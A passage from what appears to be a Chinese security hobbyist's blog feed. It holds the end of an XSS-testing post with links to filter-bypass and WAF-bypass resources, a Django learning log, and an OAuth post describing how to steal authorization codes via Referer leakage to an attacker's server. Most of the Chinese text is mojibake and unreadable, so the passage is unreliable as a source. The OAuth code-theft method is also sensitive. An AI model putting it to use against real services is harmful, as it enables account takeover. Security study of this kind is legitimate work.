class="hljs-string">æµ‹è¯•å‰ä¸»åŠ¨æ‰«æç½‘ç«™ï¼Œåˆ†ææŠ¥å‘Šï¼Œé’ˆå¯¹æŠ¥å‘Šä¸­æœ‰é£é™©çš„ä½ç½®å¤šæ¬¡å°è¯•å¤ç°ï¼ˆè‹¥æ— æ³•å¤ç°ï¼Œæ­¤å¤„å¯èƒ½ä¸ºè¯¯æŠ¥ï¼‰</span><span class="hljs-number">2.</span><span class="hljs-string">Xray</span><span class="hljs-string">å¯¹å…·ä½“ä½ç½®ï¼Œè¯·æ±‚è¿›è¡Œç²¾å‡†æ‰«æï¼Œåˆ†ææŠ¥å‘Šï¼Œå°è¯•å¤ç°æŠ¥å‘Šï¼Œï¼ˆxssè¯¯æŠ¥è¾ƒå°‘ï¼Œsqlæ³¨å…¥è¯¯æŠ¥è¾ƒå¤šï¼‰</span><span class="hljs-number">3.</span><span class="hljs-string">JSPrime</span><span class="hljs-string">å¯¹ç«™ç‚¹è¿›è¡Œæ·±åº¦å®¡è®¡æ—¶å¯ç”¨äºåˆ†æç«™ç‚¹jsä»£ç æ‰§è¡Œé¡ºåºï¼Œå®¡è®¡domxss</span>ï»¿ï»¿<span class="hljs-number">7</span><span class="hljs-string">.å­¦ä¹ æå‡</span><span class="hljs-number">1</span><span class="hljs-string">.å¤šçœ‹æ¼æ´æ¡ˆä¾‹åŠå…¬å¼€æ¼æ´æŠ¥å‘Š</span><span class="hljs-number">2</span><span class="hljs-string">.å¯¹æ¼æ´å¯å°è¯•è¿›è¡Œå¤ç°ï¼ŒåŠ æ·±å°è±¡</span><span class="hljs-number">3</span><span class="hljs-string">.å¤šæ³¨é‡æ€è·¯çš„åŸ¹å…»ï¼Œå¯»å»è‡ªå·±ç‹¬ç‰¹çš„æµ‹è¯•æµç¨‹</span><span class="hljs-number">4</span><span class="hljs-string">.å¤šå¸æ”¶å›½å†…å¤–çš„æ¼æ´æ–‡ç« ç»éªŒåŠæ€è·¯</span><span class="hljs-number">5</span><span class="hljs-string">.å¯¹é€šç”¨æ¼æ´æˆ–ç³»ç»Ÿåœ¨é‡è§å‰å…ˆæŸ¥è¯¢æ”¹ç³»ç»Ÿçš„å…¬å¼€é€šç”¨æ¼æ´</span><span class="hljs-number">6</span><span class="hljs-string">.å¯¹å¥½çš„çŸ¥è¯†ç‚¹æˆ–å†…å®¹è¿›è¡Œæ”¶é›†æ•´ç†</span><span class="hljs-string">http://www.58q8.com/web/hkdh/</span>   <span class="hljs-string">å®‰å…¨ç½‘ç«™å¯¼èˆª</span><span class="hljs-string">https://www.exploit-db.com/google-hacking-database</span>   <span class="hljs-string">Google</span> <span class="hljs-string">hack</span> <span class="hljs-string">èµ„æ–™åº“</span><span class="hljs-string">http://www.cnnvd.org.cn/</span>  <span class="hljs-string">å®‰å…¨ä¿¡æ¯åº“</span><span class="hljs-string">http://whatweb.bugscaner.com/look/</span>  <span class="hljs-string">cmsæŸ¥è¯¢</span><span class="hljs-string">http://tools.bugscaner.com/subdomain/</span> <span class="hljs-string">å­åŸŸå</span><span class="hljs-string">https://site.ip138.com/myoas.com/domain.htm</span> <span class="hljs-string">ip</span><span class="hljs-string">https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet</span> <span class="hljs-string">xss</span> <span class="hljs-string">bypass</span><span class="hljs-string">http://kumamon.fun/MyBB-RCE/</span> <span class="hljs-string">bbcodeåµŒå¥—</span><span class="hljs-string">https://www.freebuf.com/articles/web/81959.html</span> <span class="hljs-string">å¸¸è§wafç»•è¿‡</span><span class="hljs-string">https://html5sec.org/</span> <span class="hljs-string">h5security</span><span class="hljs-string">https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html</span></code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>xss</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>django_learn</title>
    <link href="/2020/06/16/django-learn/"/>
    <url>/2020/06/16/django-learn/</url>
    
    <content type="html"><![CDATA[<h1 id="djangoå¼€å‘"><a href="#djangoå¼€å‘" class="headerlink" title="djangoå¼€å‘"></a>djangoå¼€å‘</h1><blockquote><p>å¼€å‘èƒ½åŠ›å¤ªå¼±äº†ï¼Œå­¦å­¦djangoçš„å¼€å‘â€¦.</p></blockquote><h2 id="0x00-ç¯å¢ƒæ­å»º"><a href="#0x00-ç¯å¢ƒæ­å»º" class="headerlink" title="0x00 ç¯å¢ƒæ­å»º"></a>0x00 ç¯å¢ƒæ­å»º</h2><p>ç”Ÿæˆè™šæ‹Ÿç¯å¢ƒï¼Œåœ¨å…¶ä¸­çš„ç¯å¢ƒé…ç½®ä¸ä¼šå½±å“ä¸»é…ç½®</p><h4 id="vitualenv"><a href="#vitualenv" class="headerlink" title="vitualenv"></a><strong>vitualenv</strong></h4><pre><code class="hljs python">pip install virtualenvvirtualenv my_env//ç”Ÿæˆè™šæ‹Ÿç›®å½•source my_env/bin/activate//æ¿€æ´»ç¯å¢ƒsource my_env/bin/deactivate//ç¦ç”¨</code></pre><h4 id="Django"><a href="#Django" class="headerlink" title="Django"></a><strong>Django</strong></h4><pre><code class="hljs angelscript">pip install Django === <span class="hljs-number">2.0</span><span class="hljs-number">.5</span>django-admin startproject d3vil_pylearn<span class="hljs-comment">//ç”Ÿæˆé¡¹ç›®</span>python manage.py migrate<span class="hljs-comment">//ç”Ÿæˆå¯¹åº”æ•°æ®è¡¨</span>python manage.py runserver</code></pre><blockquote><p>__init_æ–‡ä»¶ï¼Œå°†è¯¥ç›®å½•è§†ä¸ºä¸€ä¸ªæ¨¡å—</p><p>_setting.py,é¡¹ç›®è®¾ç½®</p><p>_urls.py,é¡¹ç›®è·¯ç”±</p><p>_wsgi.py,æœåŠ¡å™¨ç½‘å…³æ¥å£è¿è¡Œé¡¹ç›®</p></blockquote><p>åˆ°æ­¤å°±åˆ›å»ºäº†djangoçš„æ¡†æ¶ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è¦åœ¨æ­¤æ¡†æ¶ä¸Šè¿›è¡ŒåŠŸèƒ½çš„å®Œå–„ã€‚</p><pre><code class="hljs vim"><span class="hljs-keyword">python</span> manage.<span class="hljs-keyword">py</span> startapp blog</code></pre><blockquote><p>admin.py            æ³¨å†Œæ¨¡å‹</p><p>apps.py                ä¸»è¦é…ç½®</p><p>migrations            æ•°æ®åº“è¿ç§»ï¼Œè·Ÿè¸ªæ¨¡å—å˜åŒ–ï¼ŒåŒæ­¥æ•°æ®åº“</p><p>models.py            æ•°æ®æ¨¡å‹</p><p>tests.py                    æµ‹è¯•</p><p>views.py                æ¥æ”¶è¯·æ±‚ï¼Œå“åº”è§†å›¾</p></blockquote><p>åˆæ­¥äº†è§£djangoåï¼Œå‘ç°å…¶mvcæ€æƒ³éšå¤„å¯è§ï¼Œsetting.pyé‡Œé¢åŒ…å«äº†éœ€è¦çš„é…ç½®æ–‡ä»¶ï¼Œåœ¨migrateæ—¶ä¸»è¦é’ˆå¯¹æ­¤ä¸­çš„appè¿›è¡Œæ•°æ®åº“è¡¨çš„é…ç½®ï¼Œè€Œæ¯ä¸€ä¸ªappä¸­åˆæœ‰ä¸ªmodelæ¥è¿›è¡Œæ•°æ®æ¨¡å‹çš„å®šä¹‰ï¼Œå‡ç”¨ä¸€ä¸ªmodelç±»çš„å­ç±»æ¥è¿›è¡Œå®šä¹‰ï¼Œå°è£…äº†ä¸€äº›è¯¸å¦‚datetimeFieldï¼ŒCharFieldç­‰çš„æ•°æ®ç»“æ„å®šä¹‰ã€‚viewæ¥è¿›è¡Œæ˜¾ç¤º</p><p><img src="/img/app/1.png" srcset="/img/loading.gif" alt=""></p><p>åœ¨è¿›è¡Œå®Œmodelçš„æ•°æ®æ¨¡å‹è®¾è®¡åï¼Œæˆ‘ä»¬å°†è¿™ä¸ªappå¼•å…¥åˆ°æˆ‘ä»¬çš„é¡¹ç›®è®¾ç½®ä¸­æ¥å†</p><pre><code class="hljs sqlite">python manage.py makemigrations pollså°±å¯ä»¥å®Œæˆæ•°æ®è¡¨å»ºç«‹python manage.py sqlmigrate polls 0001ä¸å¯¹ï¼Œåªæ˜¯ç”Ÿæˆäº†å¯¹åº”çš„migrationæ–‡ä»¶ï¼Œç°åœ¨è¿™ä¸ªæ˜¯æå¯¹åº”çš„sqlè¯­å¥çœ‹æ¥djangoé€šè¿‡è¿™ä¸ªæ¥å®ç°å¯ç§»æ¤æ€§BEGIN;---- Create model Choice--CREATE TABLE &quot;polls_choice&quot; (&quot;id&quot; integer NOT NULL PRIMARY KEY AUTOINCREMENT, &quot;choice_text&quot; varchar(200) NOT NULL, &quot;votes&quot; integer NOT NULL);---- Create model Question--CREATE TABLE &quot;polls_question&quot; (&quot;id&quot; integer NOT NULL PRIMARY KEY AUTOINCREMENT, &quot;question_text&quot; varchar(200) NOT NULL, &quot;pub_date&quot; datetime NOT NULL);---- Add field question to choice--ALTER TABLE &quot;polls_choice&quot; RENAME TO &quot;polls_choice__old&quot;;CREATE TABLE &quot;polls_choice&quot; (&quot;id&quot; integer NOT NULL PRIMARY KEY AUTOINCREMENT, &quot;choice_text&quot; varchar(200) NOT NULL, &quot;votes&quot; integer NOT NULL, &quot;question_id&quot; integer NOT NULL REFERENCES &quot;polls_question&quot; (&quot;id&quot;) DEFERRABLE INITIALLY DEFERRED);INSERT INTO &quot;polls_choice&quot; (&quot;id&quot;, &quot;choice_text&quot;, &quot;votes&quot;, &quot;question_id&quot;) SELECT &quot;id&quot;, &quot;choice_text&quot;, &quot;votes&quot;, NULL FROM &quot;polls_choice__old&quot;;DROP TABLE &quot;polls_choice__old&quot;;CREATE INDEX &quot;polls_choice_question_id_c5b4b260&quot; ON &quot;polls_choice&quot; (&quot;question_id&quot;);COMMIT;</code></pre><p>Then execute migrate to execute sql.</p><p>ç„¶åæ˜¯æ•°æ®åº“çš„æ“ä½œ</p><pre><code class="hljs routeros">åœ¨å»ºç«‹å¥½æ•°æ®åº“åï¼ŒæŸ¥è¯¢æ“ä½œå¦‚ä¸‹<span class="hljs-keyword">from</span> polls.models import Choice, Questionå¼•å…¥ç±»Question.objects.all()æŸ¥è¯¢ç±»æ¯”äºselect * <span class="hljs-keyword">from</span> è¡¨QUEStionQuestion.objects.filter(<span class="hljs-attribute">id</span>=1)select * <span class="hljs-keyword">from</span> Question where <span class="hljs-attribute">id</span>=1Question.objects.filter(<span class="hljs-attribute">question_text__startswith</span>=<span class="hljs-string">'What'</span>)Question.objects.<span class="hljs-builtin-name">get</span>(<span class="hljs-attribute">pub_date__year</span>=current_year)æ³¨æ„getå’Œfilteræ–¹æ³•ä¸åŒï¼Œgetèƒ½æŠŠå¯¹è±¡å–å‡ºæ¥ç„¶åæ‰èƒ½è°ƒç”¨è¿™ä¸ªæ–¹æ³•å› ä¸ºå…³ç³»æ•°æ®çš„åŸå› ï¼Œchoiceé‡Œçš„questionæ˜¯Questionçš„å¤–é”®ï¼Œæ¥ä¸‹æ¥è¿·æƒ‘æ“ä½œè­¦å‘Šq.choice_set.all()æŸ¥è¯¢Questionå¯¹è±¡çš„choiceå¯¹è±¡q.choice_set.create(<span class="hljs-attribute">choice_text</span>=<span class="hljs-string">'Not much'</span>, <span class="hljs-attribute">votes</span>=0)è®¾ç½®ä¸€ä¸ªc = q.choice_set.create(<span class="hljs-attribute">choice_text</span>=<span class="hljs-string">'Just hacking again'</span>, <span class="hljs-attribute">votes</span>=0)cæ˜¯ä¸€ä¸ªchoiceå¯¹è±¡ç¡®å¯ä»¥è°ƒç”¨related objectsï¼Œå¯èƒ½æ˜¯ç”¨çš„å­ç±»å®ç°å¤–é”®ï¼Ÿ&gt;&gt;&gt; c.question&lt;Question: What<span class="hljs-string">'s up?&gt;</span><span class="hljs-string">&gt;&gt;&gt; q.choice_set.all()</span><span class="hljs-string">&lt;QuerySet [&lt;Choice: Not much&gt;, &lt;Choice: The sky&gt;, &lt;Choice: Just hacking again&gt;]&gt;</span><span class="hljs-string">c.delete()å°±å¯ä»¥</span></code></pre><h4 id="åˆ›é€ ç®¡ç†å‘˜"><a href="#åˆ›é€ ç®¡ç†å‘˜" class="headerlink" title="åˆ›é€ ç®¡ç†å‘˜"></a>åˆ›é€ ç®¡ç†å‘˜</h4><pre><code class="hljs vim">$ <span class="hljs-keyword">python</span> manage.<span class="hljs-keyword">py</span> createsuperuser</code></pre><p><img src="/img/app/2.png" srcset="/img/loading.gif" alt=""></p><p>ä½†æˆ‘ä»¬çš„adminç®¡ç†é¡µé¢é‡Œè¿˜æ²¡æœ‰æˆ‘ä»¬çš„pollsæ•°æ®ï¼Œ</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.contrib <span class="hljs-keyword">import</span> admin<span class="hljs-comment"># Register your models here.</span><span class="hljs-keyword">from</span> .models <span class="hljs-keyword">import</span> Questionadmin.site.register(Question)</code></pre><p>è¿™æ ·åœ¨admin.pyé‡Œæ³¨å†Œæˆ‘ä»¬çš„æ¨¡å‹ï¼Œå°±å¯ä»¥åœ¨åå°ä¸­è¿›è¡Œç®¡ç†</p><p>è¸©äº†ä¸ªå‘ï¼Œæ˜¾ç¤ºæ—§è¡¨ä¸å­˜åœ¨ï¼Œæ›´æ–°äº†ä¸‹djangoï¼Œ3.10å°±å¯ä»¥äº†</p><p>å—¯ï¼Œä»Šå¤©å°±è¿™æ ·ï¼Œæ˜å¤©å¼€å§‹å¯¹è¿™ä¸ªæŠ•ç¥¨ç¨‹åºçš„viewè¿›è¡Œåˆ›å»º</p><blockquote><p>â€‹    æ€»ç»“ä¸‹ï¼Œä»Šå¤©å¼€å§‹äº†djangoçš„å­¦ä¹ ï¼Œè¿™ä¸ªæ¡†æ¶éå¸¸çš„çµæ´»ï¼Œä¸”mvcçš„æ€æƒ³éšå¤„å¯è§ï¼Œé¡¹ç›®çš„é…ç½®æ–‡ä»¶ä¸»è¦ç”±setting.pyè¿›è¡Œé…ç½®ï¼Œåº”ç”¨äº†å“ªä¸ªappï¼Œè€Œå¯¹åº”çš„æ•°æ®æ¨¡å‹åœ¨å„ä¸ªappçš„modelé‡Œè¿›è¡Œè®¾è®¡ä¿®æ”¹ï¼Œä¼šå…ˆå¯¹modelè¿›è¡Œç”Ÿæˆè¿ç§»çš„æ“ä½œï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨æ‰§è¡Œå‰çœ‹åˆ°sqlè¯­å¥ï¼Œæ€»çš„æ“ä½œå‡é€šè¿‡migrateæ¥æ“ä½œã€‚ç„¶åä¹Ÿæ˜¯æ•°æ®è¡¨çš„æ“ä½œé modelé‡Œé¢çš„æ•°æ®å¯¹è±¡ç±»æ¥å®ç°ï¼Œå¯¹è±¡ä¹‹é—´å¯ä»¥ç”¨å¤–é”®å»ºç«‹è”ç³»ï¼Œå­ç±»æ‰§è¡Œçˆ¶ç±»æ–¹æ³•ã€‚ç„¶åæ˜¯ç®¡ç†å‘˜ç•Œé¢å¯å¯¹æ•°æ®è¿›è¡Œç›´æ¥æ“ä½œã€‚</p></blockquote><h4 id="è§†å›¾"><a href="#è§†å›¾" class="headerlink" title="è§†å›¾"></a>è§†å›¾</h4><p>ä»Šå¤©å¼€å§‹è§†å›¾éƒ¨åˆ†çš„å­¦ä¹ ï¼Œä¼°äº†ä¸€å¤©ï¼Œæ˜¨å¤©å»æŒ–asrcäº†ï¼Œè¿™ä¸¤å¤©å­¦äº†xssä¸å°‘ï¼ŒåŸæ¥ä»¥ä¸ºhtmlspecialcharä¹‹åå°±æ— è§£äº†ï¼ŒåŸæ¥ä¸€ä¸ªå®ä½“åŒ–å°±é¥¶è¿‡äº†â€¦.æ¯å¤©äº¿ç‚¹ç‚¹å­¦ä¹ â€¦.</p><p>â€‹    å¥½å›å½’æ­£é¢˜ã€‚</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">detail</span><span class="hljs-params">(request, question_id)</span>:</span>    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">"You're looking at question %s."</span> % question_id)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">results</span><span class="hljs-params">(request, question_id)</span>:</span>    response = <span class="hljs-string">"You're looking at the results of question %s."</span>    <span class="hljs-keyword">return</span> HttpResponse(response % question_id)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vote</span><span class="hljs-params">(request, question_id)</span>:</span>    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">"You're voting on question %s."</span> % question_id)</code></pre><p>é¦–å…ˆåœ¨view.pyé‡Œåˆ›é€ ä¸åŒçš„è·¯ç”±å‡½æ•°</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.urls <span class="hljs-keyword">import</span> path<span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> viewsurlpatterns = [    <span class="hljs-comment"># ex: /polls/</span>    path(<span class="hljs-string">''</span>, views.index, name=<span class="hljs-string">'index'</span>),    <span class="hljs-comment"># ex: /polls/5/</span>    path(<span class="hljs-string">'&lt;int:question_id&gt;/'</span>, views.detail, name=<span class="hljs-string">'detail'</span>),    <span class="hljs-comment"># ex: /polls/5/results/</span>    path(<span class="hljs-string">'&lt;int:question_id&gt;/results/'</span>, views.results, name=<span class="hljs-string">'results'</span>),    <span class="hljs-comment"># ex: /polls/5/vote/</span>    path(<span class="hljs-string">'&lt;int:question_id&gt;/vote/'</span>, views.vote, name=<span class="hljs-string">'vote'</span>),]</code></pre><p>åœ¨url.pyä¸­åŠ å…¥æˆ‘ä»¬çš„è·¯ç”±</p><p><img src="/img/app/3.png" srcset="/img/loading.gif" alt=""></p><p>åªè¦æˆ‘ä»¬çš„urlå¯¹åº”äº†url.pyé‡Œé¢çš„å‚æ•°ï¼Œå°±ä¼šå»è°ƒç”¨å¯¹åº”çš„å‡½æ•°å¤„ç†ç›¸åº”çš„è¯·æ±‚ï¼ŒåŒç†è®¿é—®/polls/5/results/å°±ä¼šè°ƒç”¨resultså‡½æ•°ã€‚</p><p>è¯•ä¸‹xssï¼Ÿemmmï¼Œæ˜¯intå‹çš„ï¼Œä¸å¾—è¡Œ</p><p><img src="/img/app/4.png" srcset="/img/loading.gif" alt=""></p><p>å—¯ï¼ŒæŠŠå¯¹åº”æ¥å£æ”¹æˆstråå°±å¯ä»¥xäº†ï¼Œä¸ä¼šçœŸæœ‰èœé¸Ÿå¼€å‘å‘˜è¿™æ ·å†™å§ï¼Ÿä¸ä¼šå§ä¸ä¼šå§ã€‚</p><p>æœ‰äº†è§†å›¾åï¼Œæ€ä¹ˆæ›´æ–¹ä¾¿æ›´å¥½çœ‹å‘¢ï¼Ÿï¼Ÿ</p><p>æ¨¡æ¿ã€‚</p><pre><code class="hljs django"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> latest_question_list %&#125;</span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><span class="xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> question <span class="hljs-keyword">in</span> latest_question_list %&#125;</span><span class="xml">        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/polls/</span></span></span><span class="hljs-template-variable">&#123;&#123; question.id &#125;&#125;</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">/"</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123; question.question_text &#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">else</span></span> %&#125;</span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>No polls are available.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span></code></pre><p>emmm,è¯•äº†ä¸‹æ”¾åœ¨texté‚£é‡Œå’‹ä¸è¡Œé¦â€¦..</p><p>å—¯ï¼Œç¡äº†ç¡äº†ã€‚ã€‚ã€‚mmpæœ€åè¿™ä¸ªæ¨¡å‹æ˜¯æ‡µé€¼çš„æ…¢æ…¢åšä¸¤ä¸ªåº”ç”¨å§ã€‚ã€‚ã€‚</p><p>æ˜å¤©å¼€å§‹åšblog app</p><h4 id="Blog"><a href="#Blog" class="headerlink" title="Blog"></a>Blog</h4>]]></content>
    
    
    
    <tags>
      
      <tag>develop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è´¦æˆ·æƒé™è®¤è¯</title>
    <link href="/2020/06/14/http_leek/"/>
    <url>/2020/06/14/http_leek/</url>
    
    <content type="html"><![CDATA[<h2 id="è´¦æˆ·å®‰å…¨æƒé™ç®¡ç†"><a href="#è´¦æˆ·å®‰å…¨æƒé™ç®¡ç†" class="headerlink" title="è´¦æˆ·å®‰å…¨æƒé™ç®¡ç†"></a>è´¦æˆ·å®‰å…¨æƒé™ç®¡ç†</h2><h3 id="Oauth"><a href="#Oauth" class="headerlink" title="Oauth"></a>Oauth</h3><blockquote><p>éšç€å„ç±»webåº”ç”¨å±‚å‡ºä¸ç©·ï¼Œä¸ºäº†è®©æƒé™ç®¡ç†å’Œè®¿é—®æ§åˆ¶æ›´æ–¹ä¾¿ï¼Œå¼•å…¥äº†oauthä½“ç³»ï¼Œæˆ‘ä»¬åœ¨è®¿é—®åº”ç”¨æ—¶å¯ä»¥é€šè¿‡ç¬¬ä¸‰æ–¹åº”ç”¨æˆæƒæ¥ç™»å½•ï¼Œå¦‚å¾®ä¿¡æ”¯ä»˜å®ç™»å½•ã€‚</p></blockquote><pre><code class="hljs angelscript">ç”¨æˆ·ç‚¹å‡»ç™»å½• <span class="hljs-comment">//</span> å‘Šè¯‰loginé¡µé¢æˆ‘è¦ç”¨ç¬¬ä¸‰æ–¹å¹³å°ä¸Šä½  ç„¶åè¿™ä¸ªloginé¡µé¢å°±ä¼šå›ç­”ä½ ï¼š å¥½çš„ä½ å»è·Ÿè€å¤§å“¥è¯´ä¸‹å§ï¼Œä½ è¦å‘Šè¯‰è¿™ä¸ªåœ°å€ä¸‰ä»¶äº‹ï¼š <span class="hljs-number">1.</span>æ˜¯æˆ‘è®©ä½ æ¥çš„ client_id  <span class="hljs-number">2.</span>ç”¨codeæˆæƒæ¨¡å¼  <span class="hljs-number">3.</span>redirect_url æ˜¯ä½ æœ€ç»ˆè¦è®¿é—®çš„åº”ç”¨</code></pre><p><img src="/img/bug/1.png" srcset="/img/loading.gif" alt=""></p><p>åœ¨ç™»é™†é¡µé¢ï¼Œå½“ä½ æ‰«ç çš„æ—¶å€™å…¶å®æ˜¯æ¥åˆ°äº†open.weixin.qq.comè¿™ä¸ªåŸŸåæ¥è¿›è¡Œoauthè®¤è¯</p><p>æˆ‘ä»¬æ‰«ç ï¼Œä»–å°±ä¼šè®¿é—®è¿™ä¸ªè¿æ¥ï¼Œç„¶åç”¨burpæ‹¦æˆªåŒ…çœ‹çœ‹</p><p><img src="/img/bug/2.png" srcset="/img/loading.gif" alt=""></p><p>é¦–å…ˆä¼šå‘ä¸€ä¸ªå‘å¾®ä¿¡çš„è¿æ¥è¯·æ±‚ï¼Œå¸¦æœ‰uuid(å‰é¢è¯´çš„client_id)ï¼Œå› ä¸ºæ˜¯å°ç¨‹åºæ‰€ä»¥æ²¡æœ‰redirect_urlï¼Ÿï¼Ÿï¼Ÿ</p><p>ç°åœ¨å·²ç»å‘Šè¯‰è¿™ä¸ªç¬¬ä¸‰æ–¹å¹³å°ä½ çš„ç›®çš„äº†ï¼Œç„¶åä»–ä¼šå‘Šè¯‰ä½ è®©ä½ å»ç™»å½•</p><p>åæ˜ åœ¨å¾®ä¿¡ç•Œé¢ä¸Šå°±æ˜¯ï¼Œæœ‰å°ç¨‹åºç™»å½•ï¼Œè¯·é—®ä½ æ˜¯å¦å‡†è®¸ï¼ˆå› ä¸ºå¾®ä¿¡å·²ç»ç™»å½•ï¼Œæ‰€ä»¥ä¸éœ€è¦ç¬¬ä¸‰æ–¹ç™»å½•è¿™ä¸€ç¯èŠ‚ã€‚ç»†åŒ–æ¥çœ‹ï¼Œè¿™ä¸€æ­¥åº”è¯¥è¿˜æœ‰å»ç™»å½•ç•Œé¢ç™»å½•ï¼Œå¹¶å‘Šè¯‰ä»–ä½ æ˜¯ä»oauthç•Œé¢æ¥çš„ï¼Œä½ ç™»é™†åè¦è·³è½¬è¿‡å»ã€‚å¹¶ç”¨ä½ ç™»å½•çš„tokenå‘oauthé¡µé¢è¦ä½ çš„codeï¼‰</p><p>ç‚¹å‡»ç¡®è®¤åï¼Œå°±ä¼šæ‹¿åˆ°ä¸€ä¸ªcode</p><p><img src="/img/bug/3.png" srcset="/img/loading.gif" alt=""></p><p>ç„¶åç”¨è¿™ä¸ªcodeå»è¯·æ±‚ä½ çš„redirect_urlå°±æ˜¯å‰é¢è¯´çš„æœ€ç»ˆè¦è®¿é—®çš„åº”ç”¨</p><p><img src="4.png" srcset="/img/loading.gif" alt=""></p><p>è¿™ä¸ªdweb2/load?code=<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>**</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p><p>å°±ä¼šå»è®¿é—®ä»–çš„apiï¼Œå¹¶ä¸”åœ¨è¿™ä¸ªæ—¶å€™å¾®ä¿¡æœåŠ¡å™¨å’ŒçŸ¥è¯†æ˜ŸçƒæœåŠ¡å™¨ä¹‹é—´å°±ä¼šé€šä¿¡</p><p>çŸ¥è¯†æ˜Ÿçƒï¼šæ¬¸è€å“¥ï¼Œè¿™ä¸ªcodeæ˜¯ä½ æ‰¹çš„å—ï¼Ÿ</p><p>å¾®ä¿¡ï¼šåºŸæ‰¹è¯ï¼Œè¿™å°±æ˜¯è€å­æ‰¹çš„</p><p>çŸ¥è¯†æ˜Ÿçƒï¼šå“¦å“¦å“¦ï¼Œå¥½çš„å“¥ï¼æˆ‘è¿™å°±æˆæƒ</p><p>ç„¶åapiå°±ä¼šç»™ä½ æˆæƒçš„cookieä½ å°±æœ‰æƒé™äº†</p><h4 id="å±å®³"><a href="#å±å®³" class="headerlink" title="å±å®³"></a>å±å®³</h4><p>å½“ç„¶ï¼Œåªè¦æ˜¯åº”ç”¨ï¼Œå°±å¯ä»¥åˆ©ç”¨ï¼Œå“‡å’”å’”</p><p>æˆ‘ä»¬å‰æ–‡å·²ç»è¯´äº†ï¼Œæœ€ç»ˆçš„åº”ç”¨æ˜¯ç”±redirect_urlå†³å®šçš„ï¼Œå°½ç®¡æœ‰åŒæºé™åˆ¶ï¼Œä½†æå®‰å…¨çš„äººå•¥æ—¶å€™æ€•è¿‡é™åˆ¶ï¼Ÿï¼Ÿ</p><p><strong>æƒ³æƒ³å’‹ä¸ªåœ¨åŸŸå†…æŠŠæ•°æ®æ‹¿å‡ºæ¥</strong></p><p>æˆ‘ä»¬å°è¯•åœ¨ä¸è·¨åŸŸçš„æƒ…å†µä¸‹è®¿é—®åŸŸå†…æ–‡ä»¶ï¼Œæ˜¯å¯ä»¥çš„ã€‚<em>å¤§ä½†æƒ³è±¡ï¼Œè¿™æœ‰å•¥ç”¨ï¼Ÿï¼Ÿ</em></p><p>ä¸‡ä¸€è¿™ä¸ªåŸŸå†…æœ‰ä¸ªæ–‡ä»¶ï¼Œé‡Œé¢æœ‰ä¸ªå›¾ç‰‡æ˜¯æˆ‘ä»¬æ¶æ„æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œæˆ–è€…æœ‰ä¸ªsrcæŒ‡å‘æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œé‚£ä¹ˆ</p><p>åœ¨æˆ‘ä»¬redirectå›æ¥åˆ°è¿™ä¸ªé¡µé¢çš„æ—¶å€™ï¼Œä»–å°±ä¼šå»è®¿é—®æˆ‘ä»¬çš„æ¶æ„æœåŠ¡å™¨ï¼Œå¹¶åœ¨refererå¤´é‡Œå¸¦ä¸Šåˆšæ‰æˆ‘ä»¬çš„è¿™ä¸ªcodeï¼Œåº”ä¸ºè¿™ä¸ªcodeæ˜¯æ”¾åœ¨urlé‡Œçš„ã€‚</p><p><img src="/img/bug/5.png" srcset="/img/loading.gif" alt=""></p><p>å“‡å’”å’”</p><p>å’±ä»¬çš„æœåŠ¡å™¨å°±èƒ½é€šè¿‡è¿™ä¸ªæ‹¿åˆ°codeï¼ç„¶åç”¨è¿™ä¸ªcodeå»è®¿é—®æˆæƒç•Œé¢æ‹¿åˆ°åˆ«çš„ç”¨æˆ·çš„æƒé™ï¼ï¼ï¼</p><p>è¿˜æœ‰â€¦â€¦â€¦</p><blockquote><p>â€‹    